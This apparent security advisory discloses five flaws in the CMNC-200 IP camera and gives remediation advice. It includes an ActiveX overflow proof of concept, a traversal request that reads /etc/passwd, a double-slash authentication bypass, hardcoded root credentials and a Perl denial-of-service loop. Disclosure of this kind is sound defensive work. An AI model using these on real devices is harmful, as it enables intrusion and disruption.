CVE: CVE-2010-4230
     CVE-2010-4231
     CVE-2010-4232
     CVE-2010-4233
     CVE-2010-4244

Finding 1: Buffer Overflow in ActiveX Control
CVE: CVE-2010-4230

The CMNC-200 IP Camera ActiveX control identified by
CLSID {DD01C8CA-5DA0-4B01-9603-B7194E561D32} is vulnerable
to a stack overflow on the first argument of the connect method.
The vulnerability can be used to set the EIP register,
allowing a reliable exploitation.

The example code below triggers the vulnerability.

<html>
<head><title>IPcam POC</title>
<script>
function Check(){
    var bf1 = 'A';
    while (bf1.length <= 6144) bf1 = bf1 + 'A';
    obj.connect(bf1,"BBBB","CCCC");
}
</script>
</head>
<body onload=" Check();">
<object classid="clsid:DD01C8CA-5DA0-4B01-9603-B7194E561D32"
id="obj">
</object>
</html></body>

Vendor Response:
No response received.

Remediation Steps:
No patch currently exists for this issue. To limit exposure,
network access to these devices should be limited to authorized
personnel through the use of Access Control Lists and proper
network segmentation.


Finding 2: Directory Traversal in Camera Web Server
CVE: CVE-2010-4231

The CMNC-200 IP Camera has a built-in web server that
is enabled by default. The server is vulnerable to directory
transversal attacks, allowing access to any file on the
camera file system.

The following example will display the contents of
/etc/passwd:

GET /../../../../../../../../../../../../../etc/passwd
HTTP/1.1

Because the web server runs as root, an attacker can read
critical files like /etc/shadow from the web-based
administration interface. Authentication is not required for
exploitation.

Vendor Response:
No response received.

Remediation Steps:
No patch currently exists for this issue. To limit exposure,
network access to these devices should be limited to authorized
personnel through the use of Access Control Lists and proper
network segmentation.


Finding 3: Web Based Administration Interface Bypass
CVE: CVE-2010-4232

The CMNC-200 IP Camera has an administrative web
interface that does not handle authentication properly.
Using a properly formatted request, an attacker can bypass
the authentication mechanism.

The first example requires authentication:
http://www.ipcamera.com/system.html

When a second forward slash is placed after the hostname,
authentication is not required.
http://www.ipcamera.com//system.html

This vulnerability allows an attacker to take full control of
the IP Camera.

Vendor Response:
No response received.

Remediation Steps:
No patch currently exists for this issue. To limit exposure,
network access to these devices should be limited to authorized
personnel through the use of Access Control Lists and proper
network segmentation.


Finding 4: Undocumented Default Accounts
CVE: CVE-2010-4233

The CMNC-200 IP Camera has undocumented default
accounts on its Linux operating system. These accounts can
be used to login via the cameras telnet interface, which
cannot be normally disabled. The usernames and passwords are
listed below.

User: root     Password: m
User: mg3500   Password: merlin

Vendor Response:
No response received.

Remediation Steps:
No patch currently exists for this issue. To limit exposure,
network access to these devices should be limited to authorized
personnel through the use of Access Control Lists and proper
network segmentation.


Finding 5: Camera Denial of Service
CVE: CVE-2010-4234

The CMNC-200 IP Camera has a built-in web server that
is vulnerable to denial of service attacks. Sending multiple
requests in parallel to the web server may cause the camera
to reboot.

Requests with long cookie header makes the IP camera reboot a few
seconds faster, however the same can be accomplished with requests
of any size.

The example code below is able to reboot the IP cameras in
less than a minute in a local network.

#!/usr/bin/perl

use LWP::UserAgent;

while (1 == 1){

$ua = new LWP::UserAgent;
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US;
rv:1.8.1.6)");

$req = HTTP::Request->new(GET => 'http://192.168.10.100');
$req->header(Accept =>
"text/xml,application/xml,application/xhtml+xml,text/html
;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5");
$req->header("Keep-Alive" => 0);
$req->header(Connection => "close");
$req->header("If-Modified-Since" => "Mon, 12 Oct 2009
02:06:34 GMT");
$req->header(Cookie =>
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
my $res = $ua->request($req);

}

Vendor Response:
No response received.

Remediation Steps:
No patch currently exists for this issue. To limit exposure,
network access to these devices should be limited to authorized
personnel through the use of Access Control Lists and proper
network segmentation.
